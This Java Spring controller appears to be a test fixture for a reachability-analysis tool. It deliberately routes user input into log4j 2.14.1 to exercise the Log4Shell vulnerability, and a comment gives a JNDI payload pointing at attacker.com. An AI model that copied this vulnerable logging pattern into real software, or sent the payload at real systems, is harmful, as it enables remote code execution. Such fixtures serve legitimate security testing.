package com.example;

import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.springframework.web.bind.annotation.*;

import java.util.Map;

/**
 * REACHABLE: log4j-core CVE-2021-44228 (Log4Shell)
 *
 * Call path:
 *   HTTP POST /api/log
 *     → LogController.logMessage()
 *       → logger.info(userInput)  ← JNDI lookup triggered if input = ${jndi:...}
 *
 * log4j 2.14.1 performs JNDI lookups on log message interpolation.
 * The Java call graph must trace: entrypoint → logger.info() → log4j-core.
 */
@RestController
@RequestMapping("/api")
public class LogController {

    // log4j-core Logger — CVE-2021-44228 triggered when user input reaches .info()
    private static final Logger logger = LogManager.getLogger(LogController.class);

    /**
     * Live endpoint: user-controlled input flows directly into log4j.
     * Payload: {"message": "${jndi:ldap://attacker.com/exploit}"}
     */
    @PostMapping("/log")
    public Map<String, Object> logMessage(@RequestBody Map<String, String> body) {
        String userMessage = body.getOrDefault("message", "");

        // CVE-2021-44228: logger.info() interpolates ${jndi:...} lookups.
        // This is the live REACHABLE code path.
        logger.info("User message: {}", userMessage);

        return Map.of("logged", true, "length", userMessage.length());
    }

    @GetMapping("/health")
    public Map<String, String> health() {
        return Map.of("status", "ok");
    }
}
